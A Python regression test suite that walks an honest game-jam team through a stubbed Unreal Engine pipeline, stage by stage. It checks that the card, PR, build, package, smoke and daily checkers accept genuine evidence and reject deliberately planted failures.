"""Honest-path regression: one jam walked end to end by an honest team, with the real tools (final-8 root cause,
final-9 dry run A C1 and H7).

Each round of tightening against attacks broke an honest path. This suite is the guard: any change that breaks
the honest path fails here. It copies the repo's tools and docs (never its game files, so a jam-filled repo gives the
same walk) into a sandbox with a stub engine (tests/test_ue_scripts.py FakeRepo stubs). The RunUAT stub "compiles"
the stand-in game (tests/fixtures/honest_jam/compile_stub.py + game.sh): commit, workbench, platform and the live
`// bake:` values are built into the binary, the way a real package has them; the game never reads BUILD_INFO.
It walks:

  Day 0     every Day-0 card and the MVP 2 card as the Producer files them (fixtures/honest_jam/cards/*.json)
            through check_card.py; card 0.0 fills the Clock, People and Team hours (--clock, --people pass) and its
            human PR passes check_pr.py
  0.3       the skeleton card 0.3 asks for (fixtures/.../game/s03: GameMode, Ella shell, UUmbrellaTuning, editor
            module, input assets, collision header, empty components); build.sh, test.sh --bootstrap, package.sh, the
            Win64 package (package.ps1's steps), the planted workbench-check failure, module_check --rules K run for
            real; the PR with a host=win header (Mac-only evidence and a "Not run" line both fail); bootstrap daily
  0.5/0.5b  the test pattern with the planted MustFail; the Owl row merged
  0.6       the smoke hook: Mac and Win64 smokes with SMOKE_EFFECTIVE, the planted SMOKE_FORCE_CRASH; PR; daily
  MVP 2     QA-01 merged, the lift tuning struct marked: input=ok, SMOKE_EFFECTIVE has the live values; a binary whose
            live value differs (STUB_LIVE) fails the smoke and the PR
  revert    a card that added tests is reverted on main: the next daily is green (baseline per commit ancestry); a
            daily on an older commit (backfill) is green; a test deleted while its row stays merged still fails
  G1        the DAILY line, playthrough-check, the zip built from the Win64 package output, its Windows LAUNCH smoke
            (SMOKE_ZIP), butler, ui_check ci, merge-check; the record (with the --clock line first) through
            check_card.py --gate-record, which reads the machine records; an edited DAILY line fails
  0.10a     L_StyleFrame cooked with its no-player-maps row: the daily smokes it with input=none and stays green
  0.21      the title screen: the hook passes it through StartPlay, the daily on GameDefaultMap keeps input=ok;
            card 0.21 owns the Flow test
  G2, G3    client tests on, restart cycles on
  G4        the bake on per-component F<Comp>Tuning headers and a .cpp flag table (EFeatureId tokens, % keys in
            percent, every value at its GDD start): defaults, validate, bake, check --complete, --record; the G4
            record's LAUNCH line passes `bake_preset effective --complete`; a launched binary with a drifted value
            fails the record
  CI        every run step of .github/workflows/pipeline-checks.yml on the final tree, with the jam's own files
  unit      the CI unit-test step (`python3 -m unittest discover -s tests -v`) on a clone of the sandbox after each
            stage above (0.0, 0.3, 0.6, MVP 2, G1, 0.21, G4), so a test that asserts the repo is still unfilled, or
            copies live repo state in as a fixture, fails here (dry run A C1). The nested run skips this file
  hooks     install_git_hooks.py over the stock Git LFS post-commit hook

Not run here: the real editor, cook and game, and PowerShell. The Win64 package runs package.ps1's steps (clean-tree,
workbench-check, the commit stamp, BuildCookRun with -platform=Win64, build-info --commit) and prints package.ps1's
summary line; test_win_package_line_is_package_ps1s checks that line against package.ps1. The Win64 smoke runs
smoke.sh on the Win64 package (the same ue_run.py and bake_preset.py checks smoke.ps1 calls). The G2-G4
`ui_check ci --release` line is pasted as the tool prints it: its inputs are the UI cards' Content/ files.
"""
import concurrent.futures
import csv
import contextlib
import hashlib
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
import zipfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FIX = os.path.join(ROOT, "tests", "fixtures", "honest_jam")
SB_FIX = os.path.join(ROOT, "tests", "fixtures", "status_board")
sys.path.insert(0, os.path.join(ROOT, "tests"))
import hermetic  # noqa: E402
import test_ue_scripts as tus  # noqa: E402  the stub engine

PY = sys.executable
NESTED = os.environ.get("HONEST_JAM_NESTED") == "1"
CLOCK = {"Submission deadline": "2026-11-15T17:59-08:00", "Hard stop": "01:00-07:00",
         "Card 0.9 cutoff": "2026-11-12T14:00-08:00", "G1": "2026-11-12T20:00-08:00", "G2": "2026-11-13T20:00-08:00",
         "G3": "2026-11-14T20:00-08:00", "G4": "2026-11-15T12:00-08:00"}
CLOSED = {"G1": "2026-11-12T20:40-08:00", "G2": "2026-11-13T20:30-08:00", "G3": "2026-11-14T20:20-08:00",
          "G4": "2026-11-15T12:20-08:00"}
RELEASE_UI = "ui_check ci --release: PASS (0 problem(s))"
GAME_PATHS = ("Source/", "Content/", "Config/", "Plugins/", "UmbrellaElla.uproject", "pipeline/qa/baked.json",
              "Packaged", "Saved/", ".github/workflows/clock.yml")
PEOPLE = """## People (fill in; card 0.0)
Rows marked **BLOCKER** stop Day 1.
| Role | Person | Confirmed? | Day-1 blocker |
|---|---|---|---|
| Scope decision-maker (final call on cuts) | Rick | yes | BLOCKER |
| Creative director (tie-breaker on look, feel and theme; D34) | Rich | yes | before Nov 11 |
| Producer / time keeper, human (D-new-producer) | Ana | yes | BLOCKER |
| Integration owner (merges to main, keeps it building; one integrator owns cross-lane edits) | Josh | yes | BLOCKER |
| Packaging and submission owner | Rick | yes | BLOCKER |
| Windows packaging machine (owner, machine name, OS) | Rick, RICK-PC, Windows 11 | yes | BLOCKER |
| Game design owner (GDD 1.3 §14 design owner and approver: mechanics, GDD revisions, DEC rows, P0) | Richard | yes | BLOCKER |
| Technical Director, human (code-owner seat, D26; GDD 1.3 §14 pipeline and AI lead, design reviewer assisting) | Josh | yes | BLOCKER |
| GDD contributor and build execution (GDD 1.3 §14) | Rick | yes | |
| Human testers (GDD 1.3 §14, QA-12) | Richard and Rich | yes | before G2 |
| Art sign-off (human) | Rick | yes | |
| Art Director, human (D13, D38, palette) | Rich | yes | before card 0.7 |
| Audio owner (approves the mix by ear) | Ana | yes | before card 0.4c |
| Playtest lead | Ana | yes | before G1 |

## Team hours (card 0.0: one row per teammate)
| Person | Hours D1/D2/D3/D4 | Away windows | Built UE C++ before (y/n) | Confirmed? |
|---|---|---|---|---|
| Josh | 8/8/8/6 | D2 12:00-13:00 | y | yes |
| Rick | 8/8/8/6 | none | y | yes |
| Ana | 6/6/6/4 | none | n | yes |
| Richard | 4/4/4/4 | none | n | yes |

"""


def write(path, text, exe=False):
    tus.write(path, text, exe=exe)


def read(path):
    with open(path, encoding="utf-8") as fh:
        return fh.read()


def copy_tree(src, dst):
    for d, _, files in os.walk(src):
        for f in files:
            s = os.path.join(d, f)
            t = os.path.join(dst, os.path.relpath(s, src))
            os.makedirs(os.path.dirname(t), exist_ok=True)
            shutil.copy2(s, t)


class Sandbox(tus.FakeRepo):
    """The repo's tools and docs (working tree, as committed by this change; no game files, the test map at planned)
    with the stub engine of FakeRepo."""

    def __init__(self):
        super().__init__()
        shutil.rmtree(self.dir)
        os.makedirs(self.dir)
        files = subprocess.run(["git", "ls-files", "-co", "--exclude-standard", "-z"], cwd=ROOT,
                               capture_output=True, text=True, check=True).stdout.split("\0")
        for f in files:
            src = os.path.join(ROOT, f)
            if f and os.path.isfile(src) and not f.startswith(GAME_PATHS) and not hermetic.lfs_pointer(src):
                dst = os.path.join(self.dir, f)
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                shutil.copy2(src, dst)
        hermetic.write_planned_test_map(self.path("pipeline", "qa", "test-map.md"))
        # final-10 A H6: the no-player list as before the jam (card 0.10a adds its row in test_10), never the live one
        hermetic.write_pre_jam_no_player_maps(self.path("pipeline", "qa", "no-player-maps.txt"))
        # The Win64 packaging machine's daily (daily.ps1 there; no PowerShell here): ue_run.py daily run under a Python
        # that reports the packaging machine of PEOPLE as its host, so the DAILY line says RICK-PC/Windows (A H5)
        write(os.path.join(self.base, "pywin.py"),
              "import os, platform, runpy, sys\nplatform.system = lambda: 'Windows'\nplatform.node = lambda: 'RICK-PC'\n"
              "platform.release = lambda: '10'\nsys.argv = sys.argv[1:]\n"
              "sys.path.insert(0, os.path.dirname(os.path.abspath(sys.argv[0])))\n"
              "runpy.run_path(sys.argv[0], run_name='__main__')\n")
        self.pywin = os.path.join(self.base, "pywin.sh")
        write(self.pywin, f'#!/bin/sh\nexec "{PY}" "{os.path.join(self.base, "pywin.py")}" "$@"\n', exe=True)
        self.game = os.path.join(self.base, "game.sh")
        shutil.copy(os.path.join(FIX, "game.sh"), self.game)
        # STUB_TESTS=0 must mean no generated tests (BSD `seq 1 0` counts down)
        ed = os.path.join(self.engine, "Engine/Binaries/Mac/UnrealEditor.app/Contents/MacOS/UnrealEditor")
        write(ed, read(ed).replace('for i in $(seq 1 "$n"); do', 'i=0; while [ "$i" -lt "$n" ]; do i=$((i + 1));'),
              exe=True)
        # The package stub compiles the stand-in game where the real one would be (compile_stub.py)
        self.stub("Engine/Build/BatchFiles/RunUAT.sh",
                  'for a in "$@"; do case "$a" in -archivedirectory=*) d="${a#-archivedirectory=}";; '
                  '-platform=*) p="${a#-platform=}";; -target=*) t="${a#-target=}";; -project=*) pr="${a#-project=}";; '
                  'esac; done\n'
                  'if [ "$p" = Win64 ]; then o="$d/Windows/UmbrellaElla.exe"; else o="$d/Mac/UmbrellaElla"; fi\n'
                  f'"{PY}" "{os.path.join(FIX, "compile_stub.py")}" "$(dirname "$pr")" "{self.game}" "$o" "$t" "$p" || exit 1\n'
                  'if [ "$p" = Win64 ]; then mkdir -p "$d/Windows/UmbrellaElla/Binaries/Win64" '
                  '"$d/Windows/UmbrellaElla/Content/Paks"; cp "$o" "$d/Windows/UmbrellaElla/Binaries/Win64/UmbrellaElla.exe"; '
                  'echo pak > "$d/Windows/UmbrellaElla/Content/Paks/UmbrellaElla-Windows.pak"; fi\n'
                  'echo "BUILD SUCCESSFUL"; exit 0')
        self.git("init", "-q", "-b", "main")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "pre-jam")

    def git(self, *args):
        p = subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t", "-c", "core.hooksPath=/dev/null", *args],
                           cwd=self.dir, capture_output=True, text=True)
        assert p.returncode == 0, p.stderr
        return p.stdout.strip()

    def commit(self, msg, overlay=None):
        if overlay:
            copy_tree(os.path.join(FIX, "game", overlay), self.dir)
        self.git("add", "-A")
        self.git("commit", "-q", "-m", msg)
        return self.git("rev-parse", "HEAD")

    def tool(self, *args, stdin=None, env=None):
        e = dict(os.environ, **(env or {}))
        p = subprocess.run([PY, *args], cwd=self.dir, capture_output=True, text=True, input=stdin, env=e, timeout=300)
        return p.returncode, p.stdout + p.stderr

    def path(self, *parts):
        return os.path.join(self.dir, *parts)

    def mark_merged(self, card, *tests, status="merged"):
        """The building card's own PR marks the rows that hold its tests merged (pipeline/qa/test-map.md)."""
        p = self.path("pipeline", "qa", "test-map.md")
        lines = read(p).split("\n")
        for i, ln in enumerate(lines):
            if ln.startswith("|") and any(f"`{t}`" in ln for t in tests):
                cells = ln.split("|")
                cells[-3], cells[-2] = f" {card} ", f" {status} "
                lines[i] = "|".join(cells)
        write(p, "\n".join(lines))


def last_line(out, pattern):
    hits = [ln for ln in out.splitlines() if re.search(pattern, ln)]
    assert hits, f"no line matching {pattern!r} in:\n{out}"
    return hits[-1]


def pr_body(card_id, issue, owner, reviewer, changed, done, evidence, journal=None, risks="none"):
    journal = journal or f"journal.py export card=UE-{card_id}\ncard: UE-{card_id}\nNext step: {reviewer} reviews"
    assets = [c for c in changed if c.endswith((".uasset", ".umap"))]
    if assets:   # the card's human opened each changed asset in the editor (check_pr rule editor)
        evidence = evidence.rstrip() + f"\nEDITOR CHECK: by=Rick opened={','.join(assets)} ok\n"
    return (f"## Task\nPart of #{issue}. Card ID: UE-{card_id}  Owner role: {owner}  Reviewer role: {reviewer}\n\n"
            "## What changed\n" + "\n".join(changed) + "\n\n"
            "## Done-when checks\n" + "\n".join(f"- [x] {d}" for d in done) + "\n\n"
            "## Evidence\n" + evidence.rstrip() + "\ndeveloper-tested (packaged)\n\n"
            f"## Not done / risks\n{risks}\nCould not read: none\nNext: {reviewer} reviews #{issue}\n\n"
            "## Binary assets touched\nnone\n\n"
            "## Journal\n" + journal + "\n")


_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=4)


def nested_ci(sb, stage):
    """Start the CI unit-test step on a clone of the sandbox as it is now. The clone's MegaPipeline export is rebuilt
    first (known pending item: jam doc edits make it stale). Returns a future of (stage, rc, tail)."""
    d = os.path.join(sb.base, f"ci-{stage}")
    sb.git("clone", "-q", sb.dir, d)
    subprocess.run(["git", "-C", d, "tag", "-f", "jam-start", sb.git("rev-parse", "jam-start")], capture_output=True)
    subprocess.run([PY, "tools/export_package.py"], cwd=d, capture_output=True)

    def run():
        p = subprocess.run([PY, "-m", "unittest", "discover", "-s", "tests", "-v"], cwd=d, capture_output=True,
                           text=True, env=dict(os.environ, HONEST_JAM_NESTED="1"), timeout=3000)
        bad = [ln for ln in p.stderr.splitlines() if re.match(r"^(FAIL|ERROR): ", ln)]
        return stage, p.returncode, "\n".join(bad[:30]) + "\n" + p.stderr[-1500:]
    return _POOL.submit(run)


@unittest.skipIf(NESTED, "nested CI run inside the honest suite")
@unittest.skipIf(shutil.which("bash") is None, "no bash on this machine: the stub engine and tools/ue/*.sh need it "
                 "(final-10 A M13; test_ue_scripts skips the same way)")
@unittest.skipIf(os.name == "nt", "drives the Mac tools/ue/*.sh scripts on a bash stub engine (RunUAT.sh); Windows "
                 "runs the .ps1 twins, which test_ue_scripts.Ps1ParityTests checks call the same ue_run.py steps")
class HonestJam(unittest.TestCase):
    """Ordered stages; each builds on the sandbox state the one before left (test_01 ... test_17)."""

    @classmethod
    def setUpClass(cls):
        cls.sb = Sandbox()
        cls.env = {"SMOKE_ALIVE_SECONDS": "1", "SMOKE_DESKTOP_RES": "1920x1080"}
        cls.ci = []

    @classmethod
    def tearDownClass(cls):
        for f in cls.ci:
            f.cancel()
        cls.sb.close()

    def stage_ci(self, stage):
        type(self).ci.append(nested_ci(self.sb, stage))

    # ---------- helpers ----------
    def check_pr(self, body, changed, card_json, head, base=None):
        d = tempfile.mkdtemp(dir=self.sb.base)
        write(os.path.join(d, "body.md"), body)
        write(os.path.join(d, "changed.txt"), "\n".join(changed) + "\n")
        shutil.copy(os.path.join(FIX, "cards", card_json), os.path.join(d, "card.json"))
        return self.sb.tool("tools/check_pr.py", os.path.join(d, "body.md"), "--changed", os.path.join(d, "changed.txt"),
                            "--card", os.path.join(d, "card.json"), "--head", head, *(["--base", base] if base else []))

    def sh(self, script, *args, **env):
        return self.sb.sh(script, *args, **dict(self.env, **env))

    def run_daily(self, *args, expect=0, win=False, **env):
        """win=True: the gate's daily on the Win64 packaging machine (final-10 A H5; Sandbox.pywin)."""
        e = dict(self.env, SMOKE_EXE=self.sb.path("Packaged", "Mac", "UmbrellaElla"),
                 SETTINGS_INI=os.path.join(self.sb.base, "gus", "GameUserSettings.ini"), **env)
        if win:
            e["PYTHON"] = self.sb.pywin
        rc, out = self.sb.sh("daily.sh", *args, **e)
        self.assertEqual(rc, expect, out)
        return last_line(out, r"^DAILY ") if expect == 0 else out

    def merge_check(self, since, *extra):
        rc, out = self.sb.tool("tools/ue_run.py", "merge-check", "--since", since, *extra)
        self.assertEqual(rc, 0, out)
        return last_line(out, r"^merge-check: ")

    def smoke_output(self, exe=None, **env):
        return self.sh("smoke.sh", exe or self.sb.path("Packaged", "Mac", "UmbrellaElla"), **env)

    def package(self, *args, **env):
        rc, out = self.sh("package.sh", *args, **env)
        self.assertEqual(rc, 0, out)
        return out

    def win_package(self, **env):
        """package.ps1's steps on the Win64 stub (no PowerShell here): clean-tree, workbench-check, the commit stamped
        at build start, BuildCookRun -platform=Win64, build-info --commit; then package.ps1's summary line."""
        sb = self.sb
        out = os.path.join(sb.base, "win", "Packaged")
        shutil.rmtree(out, ignore_errors=True)
        for args in (("clean-tree",), ("workbench-check",)):
            rc, o = sb.tool("tools/ue_run.py", *args)
            self.assertEqual(rc, 0, o)
        commit = sb.git("rev-parse", "HEAD")
        p = subprocess.run(["bash", os.path.join(sb.engine, "Engine/Build/BatchFiles/RunUAT.sh"), "BuildCookRun",
                            f"-project={sb.path('UmbrellaElla.uproject')}", "-target=UmbrellaElla", "-platform=Win64",
                            "-clientconfig=Development", f"-archivedirectory={out}"],
                           cwd=sb.dir, capture_output=True, text=True, env=dict(os.environ, UMBRELLAELLA_BUILD_COMMIT=commit,
                                                                                 **env))
        self.assertEqual(p.returncode, 0, p.stdout + p.stderr)
        rc, o = sb.tool("tools/ue_run.py", "build-info", "--out", out, "--config", "Development", "--target",
                        "UmbrellaElla", "--workbench", "0", "--commit", commit)
        self.assertEqual(rc, 0, o)
        line = (f"package exit: 0  commit={commit}  dirty=no  target=UmbrellaElla  platform=Win64  "
                "log: C:\\jam\\Saved\\Logs\\pipeline\\package-win.log")
        return os.path.join(out, "Windows", "UmbrellaElla.exe"), line

    def build_and_test(self, *test_args, **env):
        rc, b = self.sh("build.sh", NONUNITY=1)
        self.assertEqual(rc, 0, b)
        rc, t = self.sh("test.sh", *test_args, **env)
        self.assertEqual(rc, 0, t)
        return last_line(b, r"^build exit: "), "\n".join(ln for ln in t.splitlines()
                                                         if re.match(r"^(PASS|FAIL)  tests=|^  time:", ln))

    # ---------- Day 0 ----------
    def test_01_day0_and_mvp_cards_pass_check_card(self):
        for f in sorted(os.listdir(os.path.join(FIX, "cards"))):
            with self.subTest(card=f):
                p = subprocess.run([PY, os.path.join(ROOT, "tools", "check_card.py"), "--json-stdin"], cwd=ROOT,
                                   input=read(os.path.join(FIX, "cards", f)), capture_output=True, text=True)
                self.assertEqual(p.returncode, 0, p.stdout + p.stderr)

    def test_02_card_00_fills_the_brief(self):
        sb = self.sb
        brief = sb.path("docs", "jam-brief.md")
        text = read(brief)
        for k, v in CLOCK.items():
            text = re.sub(rf"^{re.escape(k)}: .*$", f"{k}: {v}", text, flags=re.M)
            text = re.sub(rf"^\| {k} \| [^|]* \|$", f"| {k} | {v} |", text, flags=re.M)
        text = re.sub(r"^## People \(fill in; card 0\.0\).*?(?=^## Hard limits)", PEOPLE, text, flags=re.M | re.S)
        write(brief, text)
        for mode in ("--clock", "--people"):
            rc, out = sb.tool("tools/check_card.py", mode)
            self.assertEqual(rc, 0, out)
        rc, clock = sb.tool("tools/check_card.py", "--clock")
        type(self).clock_line = clock.strip().splitlines()[0]
        head = sb.commit("UE-0.0: Clock, People, Team hours")
        sb.git("tag", "jam-start")   # kickoff tags it when card 0.3 starts (tools/kickoff.py ensure_jam_start)
        ev = (f"commit={head} engine=none config=none host=mac run=none\n`python3 tools/check_card.py --clock`\n"
              + clock.strip() + "\n`python3 tools/manifest_check.py`\nmanifest_check: 0 problem(s)")
        body = pr_body("0.0", 1, "Producer", "Technical Director", ["docs/jam-brief.md Clock, People, Team hours"],
                       ["`python3 tools/check_card.py --clock` exits 0"], ev)   # agent-owned: its journal export
        rc, out = self.check_pr(body, ["docs/jam-brief.md"], "0.0.json", head)
        self.assertEqual(rc, 0, out)
        self.stage_ci("0.0")

    # ---------- card 0.3: skeleton, Day-1 bootstrap ----------
    def test_03_skeleton_pr_and_bootstrap_daily(self):
        sb = self.sb
        head = sb.commit("UE-0.3: project skeleton", "s03")
        build, tests = self.build_and_test("--bootstrap", STUB_TESTS=0, STUB_NAMES="UmbrellaElla.Bootstrap.Placeholder")
        pkg = self.package()
        _, win = self.win_package()
        rc, wb = sb.tool("tools/ue_run.py", "workbench-check")
        self.assertEqual(rc, 0, wb)
        # The Done-when asks for one planted failure: the submission target flipped to 1 on purpose
        target = sb.path("Source", "UmbrellaElla.Target.cs")
        good = read(target)
        write(target, good.replace("UMBRELLAELLA_WORKBENCH=0", "UMBRELLAELLA_WORKBENCH=1"))
        rc, wb_bad = sb.tool("tools/ue_run.py", "workbench-check")
        write(target, good)
        self.assertEqual(rc, 1, wb_bad)
        rc, k = sb.tool("tools/module_check.py", "--rules", "K")   # final-9 A H7: rule K run, not typed
        self.assertEqual(rc, 0, k)
        ev = (f"commit={head} engine=5.8.4 config=Development host=win run=packaged\n$ NONUNITY=1 tools/ue/build.sh\n"
              f"{build}\n$ tools/ue/test.sh --bootstrap\n{tests}\n$ python3 tools/ue_run.py workbench-check\n{wb.strip()}\n\n"
              f"PLANTED FAIL: submission target flipped to UMBRELLAELLA_WORKBENCH=1, then put back\n{wb_bad.strip()}\n\n"
              f"$ tools/ue/package.sh\n{pkg.strip()}\n> tools\\ue\\package.ps1\n{win}\n"
              "SMOKE_BOOTSTRAP: no smoke hook before card 0.6\n"
              f"`python3 tools/module_check.py --rules K`\n{last_line(k, 'module_check:')}")
        changed = sb.git("diff", "--name-only", "jam-start", "HEAD").split("\n")
        body = pr_body("0.3", 5, "Technical Director", "Dev Lead", changed, ["build.sh exits 0"], ev)
        rc, out = self.check_pr(body, changed, "0.3.json", head)
        self.assertEqual(rc, 0, out)
        # final-9 A H5, broken on purpose: Mac-only evidence and a "Not run" line for the Windows package both fail
        mac_only = body.replace(f"> tools\\ue\\package.ps1\n{win}\n", "")
        rc, out = self.check_pr(mac_only, changed, "0.3.json", head)
        self.assertEqual(rc, 1, out)
        self.assertIn("platform=Win64", out)
        rc, out = self.check_pr(mac_only.replace("SMOKE_BOOTSTRAP:", "Not run: package.ps1 on Windows, no machine\n"
                                                 "SMOKE_BOOTSTRAP:"), changed, "0.3.json", head)
        self.assertEqual(rc, 1, out)
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES="UmbrellaElla.Bootstrap.Placeholder", HOOK=0)
        self.assertIn("test=PASS(1/0/1, bootstrap)", line)
        self.assertIn("smoke=PASS(bootstrap alive)", line)
        self.merge_check("jam-start")
        self.stage_ci("0.3")

    # ---------- card 0.5: test pattern ----------
    def test_04_test_pattern_pr_with_planted_mustfail(self):
        sb = self.sb
        os.remove(sb.path("Source", "UmbrellaElla", "Private", "Tests", "Bootstrap", "PlaceholderTest.cpp"))
        head = sb.commit("UE-0.5: test harness pattern", "s05")
        names = "UmbrellaElla.Meta.SampleRule,UmbrellaElla.Meta.World.SampleWorld=1.02"
        build, tests = self.build_and_test(STUB_TESTS=0, STUB_NAMES=names)
        rc, planted = self.sh("test.sh", STUB_TESTS=1, STUB_STATE="Fail", STUB_NAMES=names)
        self.assertEqual(rc, 1, planted)
        planted = "\n".join(ln for ln in planted.splitlines() if re.match(r"^(FAIL|PASS)  tests=|^  - ", ln))
        ev = (f"commit={head} engine=5.8.4 config=Development host=mac run=Standalone\n{build}\n\n"
              f"PLANTED FAIL: a temporary UmbrellaElla.Meta.MustFail run once, then removed\n{planted}\n\n"
              f"$ tools/ue/test.sh\n{tests}")
        changed = ["Source/UmbrellaElla/Private/Tests/Meta/SampleRuleTest.cpp",
                   "Source/UmbrellaElla/Private/Tests/Bootstrap/PlaceholderTest.cpp"]
        body = pr_body("0.5", 8, "Gameplay Dev", "Dev Lead", changed, ["MustFail run once"], ev)
        rc, out = self.check_pr(body, changed, "0.5.json", head)
        self.assertEqual(rc, 0, out)
        # final-8 A H3, broken on purpose: the same failure without the PLANTED FAIL line fails
        rc, out = self.check_pr(body.replace("PLANTED FAIL: a temporary", "a temporary"), changed, "0.5.json", head)
        self.assertEqual(rc, 1, out)
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=names, HOOK=0)
        self.assertIn("test=PASS(2/0/2)", line)
        self.assertIn("smoke=PASS(bootstrap alive)", line)
        self.merge_check("jam-start")

    def test_05_owl_row_merged_keeps_the_daily_green(self):
        sb = self.sb
        sb.mark_merged("#10", "UmbrellaElla.Owl.EveryPatternHasTelegraph")
        sb.commit("UE-0.5b: owl data types and owl tests")
        tm = read(sb.path("pipeline", "qa", "test-map.md"))
        self.assertRegex(tm, r"\| Owl phases \|.*PhaseChangePlaysCue.*\| *\| planned \|")
        names = ("UmbrellaElla.Meta.SampleRule,UmbrellaElla.Meta.World.SampleWorld=1.02,"
                 "UmbrellaElla.Owl.EveryPatternHasTelegraph,UmbrellaElla.Owl.PhaseTableDistinct")
        type(self).names = names
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=names, HOOK=0)
        self.assertIn("test=PASS(4/0/4)", line)
        self.merge_check("jam-start")

    # ---------- card 0.6: smoke hook ----------
    def test_06_smoke_hook_pr_and_daily(self):
        sb = self.sb
        head = sb.commit("UE-0.6: smoke hook", "s06")
        build, tests = self.build_and_test(STUB_TESTS=0, STUB_NAMES=self.names)
        pkg = self.package()
        rc, smoke = self.smoke_output(SMOKE_REQUIRE_INPUT=0, INPUT="none")
        self.assertEqual(rc, 0, smoke)
        self.assertIn("bake_preset effective: PASS keys=0", smoke)
        exe, win = self.win_package()
        rc, wsmoke = self.smoke_output(exe, SMOKE_REQUIRE_INPUT=0, INPUT="none")
        self.assertEqual(rc, 0, wsmoke)
        self.assertIn("platform=Windows", wsmoke)
        rc, crash = self.smoke_output(SMOKE_REQUIRE_INPUT=0, INPUT="none", SMOKE_FORCE_CRASH=1)
        self.assertEqual(rc, 1, crash)
        ev = (f"commit={head} engine=5.8.4 config=Development host=win run=packaged\n{build}\n{tests}\n"
              f"$ tools/ue/package.sh\n{pkg.strip()}\n$ SMOKE_REQUIRE_INPUT=0 tools/ue/smoke.sh Packaged/Mac/UmbrellaElla\n"
              f"{smoke.strip()}\n> tools\\ue\\package.ps1\n{win}\n> tools\\ue\\smoke.ps1 -Exe Packaged\\Windows\\UmbrellaElla.exe\n"
              f"{wsmoke.strip()}\n\n"
              f"PLANTED FAIL: SMOKE_FORCE_CRASH=1 tools/ue/smoke.sh (-SmokeCrash)\n{crash.strip()}\n")
        changed = ["Source/UmbrellaElla/Private/Smoke/SmokeHook.cpp"]
        body = pr_body("0.6", 11, "Gameplay Dev", "Dev Lead", changed, ["SMOKE_OK on a Development package"], ev)
        rc, out = self.check_pr(body, changed, "0.6.json", head)
        self.assertEqual(rc, 0, out)
        # final-8 A H1, broken on purpose: the crashing run pasted as the evidence fails
        bad = body.replace("PLANTED FAIL: SMOKE_FORCE_CRASH=1", "SMOKE_FORCE_CRASH=1")
        rc, out = self.check_pr(bad, changed, "0.6.json", head)
        self.assertEqual(rc, 1, out)
        self.assertIn("crash folder", out)
        # final-9 B C1, broken on purpose: the game's SMOKE_EFFECTIVE lines left out of the paste
        rc, out = self.check_pr(re.sub(r"^.*SMOKE_EFFECTIVE.*\n", "", body, flags=re.M), changed, "0.6.json", head)
        self.assertEqual(rc, 1, out)
        self.assertIn("SMOKE_EFFECTIVE", out)
        line = self.run_daily(STUB_TESTS=0, STUB_NAMES=self.names, SMOKE_REQUIRE_INPUT=0, INPUT="none")
        self.assertIn("smoke=PASS(1 map(s))", line)
        self.assertNotIn("bootstrap", line)
        self.merge_check("jam-start")
        self.stage_ci("0.6")

    # ---------- MVP 2: the input proof under GDD 1.3, the first marked values ----------
    def test_07_mvp2_input_descends_and_runs_its_values(self):
        sb = self.sb
        qa01 = ("UmbrellaElla.Umbrella.OpenRises", "UmbrellaElla.Umbrella.NoLiftFallsAtGravity",
                "UmbrellaElla.Umbrella.World.NoLiftMatchesNoUmbrellaFall")
        sb.mark_merged("#21", qa01[0])
        head = sb.commit("UE-21: open umbrella lifts", "mvp2")
        type(self).names = self.names + "," + ",".join(qa01)
        rc, out = sb.tool("tools/bake_preset.py", "defaults")
        self.assertEqual(rc, 0, out)
        build, tests = self.build_and_test(STUB_TESTS=0, STUB_NAMES=self.names)
        pkg = self.package()
        rc, smoke = self.smoke_output()
        self.assertEqual(rc, 0, smoke)
        self.assertIn("input_vz=-140", smoke)
        # final-10 A H1: the card marked two keys and never touched the hook (its lane has no Smoke/ path); the hook
        # reflects over UUmbrellaTuning, so both fields are in its line and map to their keys
        self.assertFalse([f for f in sb.git("diff", "--name-only", "HEAD~1", "HEAD").split() if "/Smoke/" in f])
        self.assertIn("UmbrellaFlightTuning.AscentSpeed=120", smoke)
        self.assertIn("bake_preset effective: PASS keys=2 lines=2", smoke)
        ev = (f"commit={head} engine=5.8.4 config=Development host=mac run=packaged\n{build}\n{tests}\n"
              f"{pkg.strip()}\n{smoke.strip()}\n")
        changed = ["Source/UmbrellaElla/Private/Tests/Umbrella/UmbrellaLiftTest.cpp",
                   "Source/UmbrellaElla/Public/Umbrella/UmbrellaFlightTuning.h", "pipeline/qa/test-map.md"]
        body = pr_body("21", 21, "Gameplay Dev", "Dev Lead", changed, ["package + SMOKE_OK with input=ok"], ev)
        # the card asks for `tools\ue\smoke.ps1`: the Win64 package and its smoke are pasted too (final-9 A H5)
        exe, win = self.win_package()
        rc, wsmoke = self.smoke_output(exe)
        self.assertEqual(rc, 0, wsmoke)
        body = body.replace("host=mac", "host=win").replace(
            "\n\n## Not done", f"\n> tools\\ue\\package.ps1\n{win}\n{wsmoke.strip()}\n\n## Not done", 1)
        rc, out = self.check_pr(body, changed, "mvp2.json", head)
        self.assertEqual(rc, 0, out)
        # final-8 A H2, broken on purpose: a binding that never loads leaves UP_OPEN rising
        rc, rising = self.smoke_output(INPUT_VZ="120")
        self.assertEqual(rc, 1, rising)
        rc, out = self.check_pr(body.replace("input_vz=-140", "input_vz=120"), changed, "mvp2.json", head)
        self.assertEqual(rc, 1, out)
        # final-9 B C1, broken on purpose: the binary runs another value than the marked one (an #else branch, a
        # write in code): the smoke and the PR both fail on the game's own line
        self.package(STUB_LIVE="MOVE-21.rise_speed=550")
        rc, drift = self.smoke_output()
        self.assertEqual(rc, 1, drift)
        self.assertIn("MOVE-21.rise_speed: the running game has 550", drift)
        rc, out = self.check_pr(body.replace("UmbrellaFlightTuning.AscentSpeed=120", "UmbrellaFlightTuning.AscentSpeed=550"),
                                changed, "mvp2.json", head)
        self.assertEqual(rc, 1, out)
        # final-10 B H3, broken on purpose: the value is right at startup and written during play; the at=end read
        # (here the -SmokeQuitAfter quit) shows it
        self.package(STUB_LIVE_END="MOVE-21.rise_speed=550")
        rc, late = self.smoke_output()
        self.assertEqual(rc, 1, late)
        self.assertIn("at=end outcome=quit: MOVE-21.rise_speed: the running game has 550", late)
